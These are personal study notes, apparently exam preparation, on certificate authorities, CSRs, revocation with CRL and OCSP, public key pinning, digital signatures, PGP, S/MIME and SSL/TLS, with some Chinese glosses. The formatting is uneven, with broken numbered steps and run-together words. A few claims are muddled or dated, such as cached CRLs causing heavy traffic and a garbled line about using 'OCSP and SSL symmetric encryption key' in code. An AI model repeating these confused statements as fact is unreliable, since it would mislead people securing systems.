  - The CA will digitally sign the certificate using its private key. will use the RA-provided information to generate a digital certificate, integrate the necessary data into the certificate fields and send a copy of the certificate to the user.
  - The RA doesn’t directly issue certificates, CA do it.
certificate-signing request (CSR):
First steps in getting a certificate, submit CSR
- a request formatted for the CA.
- have the public key that you wish to use and your fully distinguished name (often a domain name).
- The CA will then use this to process your request for a digital certificate.
Trust and Certificate Verification - When a user chooses to trust a CA, she download that CA’s digital certificate and public key, stored on her local computer.
  - Most browsers have a list of CAs configured to be trusted by default
  - when a user installs a new web browser, most well-known trusted
CAs will be trusted without any change of settings.
- In the Microsoft CNG environment, the user can add and remove CAs from
this list as needed. In production environments that require a higher degree of protection, this list will be pruned, and possibly the only CAs listed will be the company’s internal CAs.
  - This ensures that digitally signed software will be automatically installed only if it was signed by the company’s CA.
  - Other products, such as Entrust, use centrally controlled policies to determine which CAs are to be trusted, instead of expecting the user to make these critical decisions.
steps involved in checking the validity of a message. example:
- Receiver receives a digitally signed message from Sender, does not know or trust.
  - digitally signed message = digital certificate, with her message, has Sender’s public key embedded within it.
1. Compare the CA that digitally signed the certificate to a list of CAs that have already been loaded into the receiver’s computer.
- To sure the authenticity of this message:
- Receiver compares the CA signed Sender’s certificate to the list of CAs he has configured in computer.
  - He trusts the CAs in his list and no others.
  - If the certificate was signed by a CA he does not have in the list, not
accept the certificate as being valid.
  - If the certificate was signed by a CA in his list of trusted CAs,
accepted.
2. Calculate a message digest for the certificate.
3. Use the CA’s public key to decrypt the digital signature and recover what is claimed to be the original message digest embedded within the certificate (validating the digital signature). 4. Compare the two resulting message digest values to ensure the integrity of the certificate.
- now verify that the certificate has not been altered.
- Using the CA’s public key and the digest certificate, Receiver can verify the
integrity of the certificate. this CA did actually create the certificate
- he now trust the origin of Sender’s certificate.
- The use of digital signatures allows certificates to be saved in public
directories without the concern of them being accidentally or intentionally altered.
  - message digest value does not match the digital signature embedded in the certificate itself = the certificate has been modified.
  - not to accept the validity of the corresponding public key.
  - Similarly, an attacker could not create a new message digest, encrypt
it, and embed it within the certificate because he would not have access to the CA’s private key.
5. Review the identification information within the certificate, such as the e- mail address.
6. Review the validity dates.
7. Check a revocation list to see if the certificate has been revoked.
- not done yet
- now verify not revoked this certificate.
  - If the start date hasn’t happened yet
  - the stop date has been passed, the certificate is not valid.
  - Receiver reviews to make sure it is still deemed valid.
- now verify whether this certificate has been revoked for any reason
  - refer to a list of revoked certificates to see if Sender’s certificate is
listed.
  - checked online: Online Certificate Status Protocol (OCSP).
- Receiver now trusts that this certificate is legitimate and that it belongs to Sender.
- now verify the integrity of the message
  - The certificate holds Sender’s public key,
  - Receiver extracts Sender’s public key from certificate.
  - runs her message, calculates a message digest value of X.
  - uses Sender’s public key to decrypt digital signature
  - a digital signature is just a message digest encrypted with a private key.   - compares values X and Y,
  - if they are the same, he is assured that the message has
not been modified during transmission.
  - Because he can decrypt the digital signature using her
public key, Receiver know that the message actually
came from Sender.
- After all of this he reads her message, useful message.
- Fortunately, all of this PKI work is performed without user intervention and happens behind the scenes. Receiver didn’t have to exert any energy. He simply replies, “Fine. How are you?”
Certificate Path Validation
certificate path validation (CPV) means that each certificate in a certificate path from the original start or root of trust down to the server or client in question is valid and legitimate.
CPV can be important if you need to verify that every link between “trusted” endpoints remains current, valid, and trustworthy.
This issue arises from time to time when intermediary systems’ certificates expire or are replaced; this can break the chain of trust or the verification path. By forcing a reverification of all stages of trust, you can reestablish all trust links and prove that the assumed trust remains assured.
Certificate Chaining and Trust Models
CAs are trusted: by placing a copy of their root certificate into a trusted root CA store.
- root certificate is the first certificate created by the CA that identifies it
- trusted root CA store: just a collection of these root certificates.
- If the CA’s root certificate is placed in this store, all certificates issued by this CA are trusted developers to have their certificates included with the web browser.
  - This way, any certificates that they sell to businesses areautomatically
trusted.
shows the Trusted Root Certification Authority store on a Windows computer.
You can see that there are many certificates from many different CAs. In the figure, I’ve selected one of the certificates from COMODO Certification Authority. One of the labs for this chapter (available at http://gcgapremium.com/501labs) shows how to access this on a Windows computer.
  The most common trust model:
hierarchical trust model, centralized trust model.
- In this model, the public CA creates the first CA, root CA.
- If the organization is large, it can create intermediate and child CAs.
  - it includes a section used to store intermediate CA certificates.
- A large trust chain works like this:
- The root CA issues certificates to intermediate CAs.
- Intermediate CAs issue certificates to child CAs.
- Child CAs issue certificates to devices or end users.
web of trust / decentralized trust model
- sometimes used with PGP and GPG.
- A web of trust uses self-signed certificates, and a third party vouches for
these certificates.
- Example - five of your friends trust a certificate, you can trust the certificate.
- If the third party is a reliable source, the web of trust provides a secure alternative.
- However, if the third party does not adequately verify certificates, it can result in the use of certificates that shouldn’t be trusted.
Certificate chaining: combines all the certificates from the root CA down to the certificate issued to the end user.
- In a small organization, the root CAcan simply issue certificates to the devices and end users.
  - not necessary to have intermediate / child CAs.
Certificate Generation and Destruction
The technical concepts behind the public key infrastructure are relatively simple.
- the processes used by certificate authorities to create, validate, and revoke client certificates.
Enrollment
Enrollment: When you want to obtain a digital certificate, you must first prove your identity to the CA in some manner;
- this sometimes involves physically appearing before an agent of the certification authority with the appropriate identification documents.
- Some certificate authorities provide other means of verification, including the use of credit report data and identity verification by trusted community leaders.
Once you’ve satisfied the certificate authority regarding your identity, you provide
them with your public key.
- The CA next creates an X.509 digital certificate (contain your identify
information and copy of your public key).
- The CA then digitally signs the certificate using the CA’s private key and provides you with a copy of your signed digital certificate.
- You may then safely distribute this certificate to anyone with whom you want to communicate securely.
Users and systems request certificates from a CA using a registration process.
- a user enters information manually into a web site form.
- a user sends a specifically formatted file to the CA.
- Within a domain, the system handles much of the process automatically
- Example
- purchase a certificate for GetCertifiedGetAhead.com for secure HTTPS sessions.
- first create a public and private key pair.
  - Many programs automate this process.
  - Example
  - OpenSSL: a command-line program in Linux
  - creates key pairs in one command and allows you to export the public key to a file in a second command.
  - Technically, OpenSSL and similar applications create the private key first. However, these applications appear to create both keys at the same time.
- I would then put together a certificate signing request (CSR) for the
certificate:
  - including the purpose of the certificate and information about the web
site, the public key, and me.
  - Most CAs require CSRs to be formatted using the Public-Key
Cryptography Standards (PKCS) #10 specification.
  - The CSR includes the public key, but not the private key.
  - A CA typically publishes a certificate template showing exactly how to format theCSR.
- After receiving the CSR, the CA validates my identity and creates a certificate with the public key.
  - validation process: different based on the usage of the certificate.
  - In some cases, it includes extensive checking, and in other cases,
verification comes from the credit card I use to purchase it.
- I can then register this certificate with my web site along with the
private key.
  - Any time someone initiates a secure HTTPS connection, the web site sends the certificate with the public key and the TLS/SSL session creates the session.
- Certificates use object identifiers (OIDs) to identify specific objects within the certificates and some CAs require OIDs within the CSR for certain items.
  - The OID is a string of numbers separated by dots.
  - can be used to name almost every object type in certificates.
  - Example
  - Google certificate
  - OID on the General tab: 1.3.6.1.4.1.11129.2.5.1   - The first 1 indicates that it is an International Organization for Standardization (ISO) OID.
  - 1.3 indicates it is an identified organization.
  - 1.3.6.1.4.1 indicates it is using an IANAenterprise number.
  - 1.3.6.1.4.1.11129 indicates the organization is Google.
  - The additional numbers (2.5.1) are specifically defined within Google’s enterprise.
In large organizations, a registration authority(RA) can assist the CA by collecting registration information.
- The RA never issues certificates
- only assists in the registration process.
If the CA is online: accessible over a network,
- submit the CSR using an automated process.
However, some CAs offline to protect them from attacks. - Offline CAs can only accept CSRs manually.
Verification
When you receive a digital certificate from someone with whom you want to communicate:
- you verify the certificate by checking the CA’s digital signature using the CA’s public key. - Next, you must check and ensure that the certificate was not published on a certificate revocation list (CRL).
- assume that the public key listed in the certificate is authentic:
  - The digital signature of the CA is authentic.
  - You trust the CA.
  - The certificate is not listed on a CRL.
  - The certificate actually contains the data you are trusting.
The last point is a subtle but extremely important item. Before you trust an identifying piece of information about someone, be sure that it is actually contained within the certificate.
- If a certificate contains the email address (billjones@foo.com) but not the individual’s name, you can be certain only that the public key contained therein is associated with that email address. The CA is not making any assertions about the actual identity of the billjones@foo.com email account. However, if the certificate contains the name Bill Jones along with an address and telephone number, the CA is vouching for that information as well.
Digital certificate verification algorithms are built in to a number of popular web browsing and email clients, so you won’t often need to get involved in the particulars of the process.
It’s also the reason that, when purchasing a certificate, you choose a CA that is widely trusted. If a CA is not included in, or is later pulled from, the list of CAs trusted by a major browser, it will greatly limit the usefulness of your certificate.
Revocation Normally, certificates expire based on the Valid From and Valid To dates. Occasionally, a certificate authority needs to revoke a certificate. This might occur
for one of the following reasons:
- The certificate was compromised 损害 :
  - a private key is publicly available, the key pair is compromised.
  - the CA itself is compromised through a security breach, certificates issued by the CA may be compromised, so the CA can revoke certificates.
- The certificate was erroneously 错误的 issued (like, the CA mistakenly issued a certificate without proper verification).
- The details of the certificate changed (like, the subject’s name changed).
- The security association changed (like, the subject is no longer employed by the organization sponsoring the certificate).
- A CA can use any of the following reasons when revoking acertificate:
- Key compromise
- CA compromise
- Change of affiliation
- Superseded
- Cease of operation
- Certificate hold
The revocation request grace period is the maximum response time within which a CA will perform any requested revocation. This is defined in the certificate practice statement (CPS).
- The CPS states the practices a CA employs when issuing or managing certificates. You can use two techniques to verify the authenticity of certificates and identify revoked certificates:
Certificate Revocation Lists (CRLs): 离线
- maintained by the various certificate authorities.
- contain the serial numbers of revoked certificates: have been revoked along with the date and time the revocation went into effect.
- The major disadvantage:
  - they must be downloaded and cross-referenced periodically
  - a period of latency 潜伏 between the time a certificate is revoked and the time end users are notified of the revocation.
   - However, CRLs is the most common method of checking certificate status in use today.
requesting a copy of the CRL:
1. The client initiates a session requiring a certificate, such as an HTTPS session.
2. The web server responds with a copy of the certificate that includes the public key.
3. The client queries the CA for a copy of the CRL.
4. The CA responds with a copy of the CRL.
5. The client checks the serial number of the certificate against the list of
serial numbers in the CRL.
  - If the certificate is revoked for any reason, the application gives an error message to the user.
CRLs are typically cached after being downloaded the first time. Instead of
 requesting another copy of the CRL, clients use the cached copy. - This generates a lot of traffic between clients and the CA.
Online Certificate Status Protocol (OCSP): 在线
- realtime certificate verification.
- OCSP provides a real-time response.
  - eliminates the latency inherent in the use of certificate revocation lists
  - using a cached CRL, they will be unaware of the revoked certificate
until another copy of the CRL is downloaded.
  - But OCSP generating a lot of real- time traffic
  - it requires a CA to respond to every request.
  - OCSP stapling solves this problem.
  - The certificate presenter (such as the web server in Figure 10.12) obtains a timestamped OCSP response from theCA.
  - Before sending it, the CA signs it with a digital signature. The certificate presenter then appends (or metaphorically staples) a timestamped OCSP response to the certificate during the TLS handshake process. This eliminates the need for clients to query the CA.
- When a client receives a certificate
  - sends an OCSP request to the CA’s OCSP server with the serial
number of the certificate.
  - The server then responds with a status of valid, invalid, or unknown.
- Example:
   - ensure a application is verifying that a key is valid before establishing SSL connections with random remote hosts on the Internet.    - OCSP and SSL symmetric encryption key sohuld be used in the code.
Certificate Issues
Before clients use a certificate, they first verify it is valid with some checks.
There are many different certificate issues that can result in an invalid certificate.
- Browsers typically display an error describing the issue and encouraging users not to use the certificate.
- Applications that detect a certificate issue might display an error using a certificate, but they are typically coded to not use it.
Some of the common issues are:
- Expired. The first check is to ensure that it isn’t expired. If the certificate is expired, the computer system typically gives the user an error indicating the certificate is not valid.
- Certificate not trusted. The next check is to see if thecertificate was issued by a trusted CA.
  - Example
  - Windows system will look in the Trusted Root Certification Authority store and the Intermediate Certification Authorities store shown previously in Figure 10.9.
  - If the system doesn’t have a copy of the CA’s certificate, it will indicate the certificate is not trusted.
  - Users can override this warning, though there are often warnings encouraging users not to continue. private.
  - If the certificates holding the private keys aren’t managed properly, it can compromise the certificate.
Public Key Pinning
Certificate Pinning: mitigate the use of fraudulent certificates.
- once a public key/certificate has been seen for a specific host, that key or
certificate is pinned to the host.
- Should a different key/certificate be seen for that host, that might indicate an issue with a fraudulent certificate.
Public key pinning
- a security mechanism
- designed to prevent attackers from impersonating a web site using fraudulent certificates.
- When configured on a web site server, the server responds to client HTTPS requests with an extra header.
- This extra header includes: a list of hashes derived from valid public keys used by the web site.
- It also includes a max-age field specifying how long the client should store and use the data.
When clients connect to the same web site again, they recalculate the hashes and then compare the recalculated hashes with the stored hashes. If the hashes match, it verifies that the client is connected to the same web site. site. This can be the public key used by the web site’s certificate. It can also include any public keys from certificates in the certificate chain such as the public key from the root CA certificate, and/or the public key from intermediate CA certificates. Last, it must include a backup key that can be used if the current key becomes invalid.
Digital Signatures
Digital signatures combine asymmetric cryptography and hashing.
implement a digital signature system for 2 distinct goals:
- assure the recipient that the message truly came from the claimed sender.
  - enforce nonrepudiation (preclude 阻止 the sender from claiming the message is forgery).
- assure the recipient that the message was not altered while in transit between the sender and recipient.
  - This protects against both malicious modification (a third party altering the meaning of the message) and unintentional modification (because of faults in the communications process, such as electrical interference).  If Alice wants to digitally sign a message she’s sending to Bob, she performs the following actions:
1. Alice generates a message digest of the original plaintext message using
hashing algorithms, like SHA-512.
2. Alice encrypts the hash using private key. This encrypted message digest is the digital signature. 3. Alice appends the digital signature with the plaintext message.
4. Alice transmits the appended message to Bob.
5. When Bob receives the digitally signed message, he reverses the procedure:
  - decrypts the digital signature using Alice’s public key.   - got hash and plaintext.
  - uses the same hashing function to create a message digest of the plaintext
message received.
  - compares the decrypted hash received with the hash he computed.
  - If match, the message he received was sent by Alice.
  - If do not match, either the message was not sent by Alice or the
message was modified while in transit.
Digital signatures are used for more than just messages. Software vendors often use digital signature technology to authenticate code distributions that you download from the Internet, such as applets and software patches.
Note that the digital signature process does not provide any privacy in and of itself. It only ensures that the cryptographic goals of integrity, authentication, and nonrepudiation are met.
However, if Alice wanted to ensure the privacy of her message to Bob, she could add a step to the message creation process.
After appending the signed message digest to the plaintext message, Alice could encrypt the entire message with Bob’s public key. When Bob received the message, he would decrypt it with his own private key before following the steps just outlined. Digital Signature Standard
The National Institute of Standards and Technology specifies the digital signature algorithms acceptable for federal government use in Federal Information Processing Standard (FIPS) 186-4, also known as the Digital Signature Standard (DSS).
This document specifies that all federally approved digital signature algorithms must use the SHA-2 hashing functions.
DSS also specifies the 3 currently approved standard encryption algorithms that can be used to support a digital signature infrastructure:
The Digital Signature Algorithm (DSA) as specified in FIPS 186-4
The Rivest, Shamir, Adleman (RSA) algorithm as specified in ANSI X9.31 The Elliptic Curve DSA (ECDSA) as specified in ANSI X9.62
2 other digital signature algorithms you should recognize, are Schnorr’s signature algorithm and Nyberg-Rueppel’s signature algorithm.
Hashing Passwords
- Passwords are often stored as hashes.
- when the user authenticates by entering a username and password, the system calculates the hash of the entered password, and then compares it with the stored hash.
- If the hashes are the same, it indicates that the user entered the correct password.
Key Features Key escrow: 由第三者保存附带条件委付盖印的契约
- addresses the possibility that a cryptographic key may be lost and there is no
way to get the key back, and the user cannot decrypt messages.
- The concern is usually with symmetric keys or with the private key in asymmetric cryptography.
- Companies that implement encryption throughout their organization often establish key escrows in order to be able to recover lost keys.
A key recovery agent
- an entity has the ability to recover a key, key components, or plain-text messages as needed.
- implement separation of duties so that no one person can independently access the key escrow account.
Key registration: the process of providing certificates to users, and a registration authority (RA) typically handles this function when the load must be lifted from a CA.
key may have expired, canceled or replaced. mechanism to find out if a key is still valid:
certificate revocation list (CRL): most widely methoda
- list of certificates that a specific CA states should no longer be used.
  - When a key is compromised, a revocation request should be made to the CA
  - It may take a day or longer for the CRL to be disseminated to everyone using that CA.
 - Now replaced by a real-time protocol, Online Certificate Status Protocol (OCSP). Stapling: a method used with OCSP
- allows a web server to provide information on the validity of its own certificate
rather than needing to go to the certificate vendor.
- done by the web server essentially downloading the OCSP response from the certificate vendor in advance and providing that to browsers.
Trust models: exist in PKI implementations, a number of types.
- simply a model of how different certificate authorities trust each other
- consequently how their clients will trust certificates from other certificate authorities.
- The 4 main types of trust models used with PKI:
  - bridge, hierarchical, hybrid, and mesh.
The Origins of Encryption Standards
Early cryptography standards: primarily designed for the government and the military. Nowaday different standards groups: often incompatible with the standards of other
groups, intended to address the specific environments for their groups.
The Role of Government Agencies
Several U.S. government agencies are involved in the creation of standards for secure systems.
directly control specific sectors of government.
or provide validation, approval, and support to government agencies. National Security Agency (NSA)
chartered in 1952, tries to keep a low profile.
responsible for creating codes, breaking codes, and coding systems for the U.S. government.
responsible for obtaining foreign intelligence and supplying it to the various U.S. government agencies that need it. largest employer of mathematicians.
missions are extremely classified, but everything involving cryptography and cryptographic systems for the U.S. government, government contractors, and the military.
National Security Agency/Central Security Service (NSA/CSS)
an independently functioning part of the NSA.
created in the early 1970s to help standardize and support Department of Defense (DoD) activities.
Supports all branches of the military.
Each branch of the military used to have its own intelligence activities and didn’t coordinate their activities well. NSA/CSS was to help coordinate their efforts.
National Institute of Standards and Technology (NIST)
known as the National Bureau of Standards (NBS)
It’s primarily concerned with governmental systems, and it exercises a great deal of
influence on them.
Shares findings with the security community as business needs are similar to government needs.
developing and supporting standards for the U.S. government for over 100 years.
involved in cryptography standards, systems, and technology in a variety of areas.
publishes information about known vulnerabilities in operating systems and applications. You’ll find NIST helpful in your battle to secure your systems. Industry Associations and the Developmental Process
Industries, like bank, has driven the development of standards. Standards frequently begin as voluntary or proprietary efforts. Request for comments (RFC): originated in 1969
used to propose a standard.
a document-creation process with a set of practices.
An RFC is categorized as standard (draft or standard), best practice, informational, experimental, or historic.
RFC editor: key role in the RFC process;
Draft documents are processed through a designated RFC editor, makes sure that the document meets publication standards.
responsible for making sure that proposals are documented properly, and they manage the discussion.
The RFC then thrown open to the computer-user community, for comments and critique. (Ensures all interested parties can comment on an RFC)
The RFC process: allows open communications about the Internet and other proposed standards.
Virtually all standards relating to the Internet that are adopted go through this process.
Several industrial associations have assumed roles that allow them to address specific environments. The following sections briefly discuss some of the major associations and the specific environments they address.
Internet Engineering Task Force (IETF)
International community of computer professionals (network engineers, vendors, administrators, and researchers)
mainly interested in improving the Internet and computer security issues.
The IETF uses working groups to develop and propose standards.
IETF membership is open to anyone. Members communicate primarily through mailing lists and public conferences.
Institute of Electrical and Electronics Engineers (IEEE) I Triple-E
International organization
focused on technology and related standards.
organized into several working groups and standards committees.
IEEE is actively involved in the development of PKC, wireless, and networking protocol standards.
Applied Cryptography
examine the use of cryptography to secure data at rest, such as that stored on portable devices, as well as data in transit, using techniques that include secure email, encrypted web communications, and networking.
Email digitalsignatures
The sender’s private key encrypts (or signs). The sender’s public keydecrypts.
Email encryption
The recipient’s public key encrypts. The recipient’s private key decrypts.
Web site encryption The web site’s public key encrypts.
The web site’s private key decrypts.
The symmetric key encrypts data in the web site session.
Email and web site: use a combination of both asymmetric and symmetric encryption.
- asymmetric encryption for key exchange, sharing a symmetric key.
- Symmetric encryption encrypts the data.
Portable Devices
The now ubiquitous 普遍存在的 nature of notebook computers, netbooks, smartphones, and tablets brings new risks to the world of computing.
contain highly sensitive information
could cause serious harm to an organization and its customers, employees, and affiliates.
For this reason, many organizations turn to encryption to protect the data on these devices in the event they are misplaced.
Current versions of popular operating systems now include disk encryption capabilities that make it easy to apply and manage encryption on portable devices.
example:
Microsoft Windows includes the BitLocker and Encrypting File System (EFS)
technologies,
Mac OS X includes FileVault encryption,
the TrueCrypt open source package allows the encryption of disks on Linux, Windows, and Mac systems.
A wide variety of commercial tools are available that provide added features and management capability. The major differentiators between these tools are how they protect keys stored in memory: whether they provide full disk or volume-only encryption,
whether they integrate with hardware-based Trusted Platform Modules (TPMs)
to provide added security.
Any effort to select encryption software should include an analysis of how well the alternatives compete on these characteristics.
Don’t forget about smartphones when developing your portable device encryption policy. Most major smartphone and tablet platforms include enterprise-level functionality that supports encryption of data stored on the phone.
Email
security should be cost effective, here are simple rules to encrypt email:
- confidentiality when sending an email message, encrypt the message.
- maintain integrity, must hash the message.
- needs authentication, integrity and/or nonrepudiation, should digitally sign the message.
- requires confidentiality, integrity, authentication, and nonrepudiation, you should encrypt and digitally sign the message.
It is always the responsibility of the sender to put proper mechanisms in place to ensure that the security of a message or transmission is maintained.
One of the most in-demand applications of cryptography is encrypting and signing email messages.
- Until recently, encrypted email required the use of complex, awkward software that in turn required manual intervention and complicated key exchange procedures.
- An increased emphasis on security in recent years resulted in the implementation of strong encryption technology in mainstream email packages.
- Next, we’ll look at some of the secure email standards in widespread use today.
Signing Email with Digital Signatures
The digital signature algorithm (DSA):
- uses an encrypted hash of a message.
- The hash is encrypted with the sender’s private key.
- recipient of a digitally signed email can decrypt the hash,
it provides the following three security benefits:
- Authentication: identifies the sender of the email.
- Non-repudiation: The sender cannot later deny sending the message.
- Integrity: provides assurances that the message has not been modified or corrupted.
Digital signatures:
- Hashing: start by creating a hash of the message. A hash is simply a number
created by executing a hashing algorithm on themessage.
- Certificates: Digital signatures need certificates, and certificates include the
sender’s public key.
- Public/private keys:
  - In a digital signature, the sender uses the sender’s private key to encrypt the hash of the message. message.
  - public key often distributed in an S/MIME.p7s formatted file.
 Lisa is sending a message to Bart with a digital signature.
- the message “I passed” is not secret. If it was, Lisa would encrypt it, which is a separate process.
- The focus in this explanation is only the digital signature.
Lisa creates her message in an email program, such as Microsoft Outlook. Once Microsoft Outlook is configured, all she does is click a button to digitally sign the message.
Here is what happens when she clicks the button:
1. The app hashes the message.
2. Theapp retrievesLisa’sprivatekeyandencryptsthehash usingthisprivatekey.
3. The app sends both the encrypted hash digital signature (the digital signature) and the unencrypted message to Bart. When Bart’s system receives the message, it verifies the digital signature using the following steps:
1.
2.
3. 4.
Bart’s system retrieves Lisa’s public key, which is in Lisa’s public certificate.   - In some situations, Lisa may have sent Bart a copy of her certificate
with her public key.
  - In domain environments, Bart’s system can automatically retrieve
Lisa’s certificate from a network location.
The email app on Bart’s system decrypts the encrypted hash with Lisa’s public key.
  - If Lisa’s public key could not decrypt it.
  - error indicating a problem with the digital signature. The app calculates the hash on the received message.
Theapp comparesthedecryptedhashwith thecalculated hash.
  - If the calculated hash of the received message is the same as the encrypted hash of the digital signature, it validates several important checks:
  - Authentication: Lisa sent the message.
  - The public key - only Lisa has the private key.
  - Non-repudiation: Lisa cannot later deny sending the message.
  - Integrity: hash matches - hasn’t been modified.
not just encrypt the message, too? resources.
it would take quite a bit of processing power to encrypt a lengthy email and its attachments.
Only encrypt when need to ensure confidentiality.
why ▪


## ▪
Encrypting Email
with Only Asymmetric Encryption 1. Lisa retrieves a copy of Bart’s certificate that contains his public key.
2. Lisa encrypts the email with Bart’s public key.
3. Lisa sends the encrypted email to Bart.
4. Bart decrypts the email with his private key.
- encrypting email contents, only recipient’s key.
- digital signature, only uses the sender’s keys.
with Asymmetric and Symmetric Encryption
The previous description provides a simplistic explanation of email encryptionused bysomeemailapplications.However,mostemailapplications combine both asymmetric and symmetric encryption. You may remember from earlier in this chapter that asymmetric encryption is slow and inefficient, but symmetric encryption is very quick.
Instead of using only symmetric encryption, most email applications use asymmetric encryption to privately share a session key. They then use symmetric encryption to encrypt the data.
1. Lisa identifies a symmetric key to encrypt her email.
  - Assume a simplistic symmetric key of 53,
  - symmetric algorithm like AES use 128- bit or larger keys.
2. Lisa encrypts the email with symmetric key 53.
3. Lisa retrieves a copy of Bart’s certificate that contains his public key.
4. She uses Bart’s public key to encrypt the symmetric key 53.
5. Lisa sends the encrypted email and the encrypted symmetric key to Bart.
6. Bart decrypts the symmetric key with his private key.
7. then decrypts the email with the decrypted symmetric key   Pretty Good Privacy (PGP)
- Phil Zimmerman
- secure email system appeared on the computer security scene in 1991.
- It combines the CA hierarchy described earlier in this chapter with the “web of trust” concept—that is, you must become trusted by one or more PGP users to begin using the system.
- You then accept their judgment regarding the validity of additional users and, by extension, trust a multilevel “web” of users descending from your initial trust judgments.
PGP initially encountered a number of hurdles to widespread use.
- The most difficult obstruction was the US government export regulations, which treated encryption technology as munitions 军需品 and prohibited the distribution of strong encryption technology outside the United States.
- Fortunately, this restriction has since been repealed, and PGP may be freely distributed to most countries.
- a method used to secure email communication.
- It can encrypt, decrypt, and digitally sign email.
- OpenPGP is a PGP-based standard created to avoid any conflict with existing licensing. In other words, users have no obligation to pay licensing fees to use it.
- Some versions of PGP follow S/MIME standards. Other versions follow OpenPGP standards.
- GNU Privacy Guard (GPG) is free software that is based on the OpenPGP standard.
- Each of the PGP versions uses the RSA algorithm and public and private keys for encryption and decryption.
- Just like S/MIME, PGP uses both asymmetric and symmetric encryption.
PGP is available in two versions.
- The commercial version
  - uses RSA for key exchange,
  - Uses IDEA for encryption/decryption,   - uses MD5 for message digest production.
- The freeware version (based on the extremely similar OpenPGP standard)
  - uses Diffie-Hellman key exchange,
  - the Carlisle Adams/Stafford Tavares (CAST) 128-bit encryption/
decryption algorithm,
  - and the SHA-1 hashing function.
Many commercial providers also offer PGP-based email services as web-based cloud email offerings, mobile device applications, or webmail plug-ins.
- remove the complexity of configuring and maintaining encryption certificates
- provide users with a managed secure email service.
- Support nonrepudiation.
- Some products in this category include StartMail, Mailvelope, SafeGmail, and Hushmail.
S/MIME
Secure Multipurpose Internet Mail Extensions (S/MIME) protocol
- de facto standard to digitally sign and encrypt email
  - Most email app support encryption and digital signatures use S/MIME
standards.
  - Microsoft Outlook, Outlook Web Access
  - Mozilla Thunderbird
  - Mac OS X Mail
- uses RSA for asymmetric encryption, AES for symmetric encryption.   - has received the backing of major industry players, including RSA Security.
  - Because S/MIME uses RSA for asymmetric encryption, it requires a PKI to distribute and manage certificates.
- It can encrypt email at rest (stored on a drive) and in transit (data sent over the network).
S/MIME relies on the use of X.509 certificates for exchanging cryptographic keys.
- The public keys contained in these certificates are used for digital signatures and for the exchange of symmetric keys used for longer communications sessions.
- RSA is the only public key cryptographic protocol supported by S/MIME.
- The protocol supports the AES and 3DES symmetric encryption algorithms.
- works in one of t0wo modes: signed and enveloped.
Despite strong industry support for the S/MIME standard, technical limitations have prevented its widespread adoption.
- Although major desktop mail applications support S/MIME email,
- mainstream web-based email systems do not support it out of the box (the
use of browser extensions is required).
Web Applications
Encryption is widely used to protect web transactions.
- mainly because of the e-commerce and the desire of both e-commerce vendors and consumers to securely exchange financial information (like credit card information) over the Web. within web browsers:
- Secure Sockets Layer (SSL)
- Transport Layer Security (TLS)
- encryption protocols commonly use to encrypt data-in- transit.
  - encrypt HTTPS, transmissions like File Transfer Protocol Secure (FTPS)...
- Both provide certificate-based authentication and they encrypt data with a combination of both symmetric and asymmetric encryption during a session.
  - TLS and SSL require certificates. Certificate Authorities (CAs) issue and manage certificates, so a CA is required to support TLS and SSL. These CAs can be internal or external third-party CAs.
  - asymmetric encryption for the key exchange (sharen session key) and symmetric encryption to encrypt data displayed on the web page and transmitted during the session.
Secure Sockets Layer (SSL)
- developed by Netscape to provide client/server encryption for web traffic. Updated to version SSL 3.0.
  - This was before organizations such as the Internet Engineering Task Force (IETF) created and maintained standards.
  - Netscape’s success waned and there wasn’t a standardization process to update SSL, even though all web browsers were using it.
  - The IETF created TLS to standardize improvements with SSL.
- Hypertext Transfer Protocol over Secure Sockets Layer (HTTPS) uses port 443 to negotiate encrypted communications sessions between web servers and browser clients. - SSL originated as a standard for Netscape browsers, Microsoft also adopted it as a security standard for its Internet Explorer browser.
  - The incorporation of SSL into both of these products made it the de facto Internet standard.
- SSL relies on the exchange of server digital certificates to negotiate encryption/decryption parameters between the browser and the web server.
- SSL’s goal is to create secure communications channels that remain open for an entire web browsing session. It depends on a combination of symmetric and asymmetric cryptography. The following steps are involved:
1. When user accesses a website
2. the browser retrieves the web server’s certificate and extracts the
server’s public key from it.
3. The browser then creates a random symmetric key
  - uses the server’s public key to encrypt it
  - sends the encrypted symmetric key to the server.
4. The server then decrypts the symmetric key using its own private key, and the two systems exchange all future messages using the symmetric encryption key.
This approach allows SSL to leverage the advanced functionality of asymmetric cryptography while encrypting and decrypting the vast 巨大的 majority of the data exchanged using the faster symmetric algorithm.
Transport Layer Security (TLS)
- As with SSL, TLS uses TCP port 443.
- Based on SSL technology, TLS incorporated many security enhancements, adopted as a replacement for SSL in most applications.
- In 1999, TLS as a replacement for the SSL standard, which was at the time in its third version.
  - The IETF has updated and published several TLS documents specifying the standard.
  - TLS 1.0: based on SSL 3.0 as SSL 3.1.
  - TLS 1.1: SSL 3.2
  - TLS 1.2: SSL 3.3
  - Early versions of TLS supported downgrading communications to
SSL v3.0 when both parties did not support TLS.
  - However, in 2011, TLS v1.2 dropped this backward compatibility.
In 2014, an attack known as the Padding Oracle On Downgraded Legacy Encryption (POODLE) demonstrated a significant flaw in the SSL 3.0 fallback mechanism of TLS. In an effort to remediate this vulnerability, many organizations completely dropped SSL support and now rely solely on TLS security.
Even though TLS has been in existence for more than a decade, many people still mistakenly call it SSL. For this reason, TLS has gained the nickname SSL 3.1.
Encrypting HTTPS Traffic with TLS
HTTP Secure (HTTPS) is commonly used on the Internet to secure web traffic.
- HTTPS commonly uses TLS to encrypt the traffic, with both asymmetric and symmetric encryption.
- HTTPS / TLS uses asymmetric encryption to transmit a symmetric key (secure key exchange). uses the symmetric key to encrypt the session data (all the data in the HTTPS session)  •
1. The client begins the process by requesting an HTTPS session.
  - entering an HTTPS address in the URL or clicking on an HTTPS link.
2. The server responds by sending the server’s certificate.
  - The certificate includes the server’s public key.
  - The matching private key is on the server and only accessible by the server.
3. The client creates a symmetric key and encrypts it with the server’s public key.
  - This symmetric key will be used to encrypt data in the HTTPS session, also called a session key.
4. The client sends the encrypted session key to the web server.
  - Only the server’s private key can decrypt this.
  - If attackers intercept the encrypted key, they won’t be able to decrypt it because they don’t have access to the server’s privatekey.
5. The server receives the encrypted session key and decrypts it with the server’s private key.
  - At this point, both the client and the server know the session key. 6. All the session data is encrypted with this symmetric key using symmetric
encryption.
Cipher Suites
Cipher suites
- a combination of cryptographic algorithms that provide several layers of security for TLS and SSL
- When two systems connect, they identify a cipher suite that is acceptable to both systems and then use the protocols within that suite.
- The protocols within the suite provide three primary cryptographic solutions. They are:
  - Encryption: provides confidentiality of data.
  - TLS uses asymmetric cryptography t o privately exchange a symmetrickey and then encrypts the data with a symmetric algorithm.
